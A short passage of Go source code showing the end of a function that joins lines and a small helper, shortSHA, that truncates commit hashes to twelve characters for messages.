	return strings.Join(lines, "\n")
}

// shortSHA abbreviates a commit hash for messages.
func shortSHA(sha string) string {
	if len(sha) > 12 {
		return sha[:12]
	}
	return sha
}
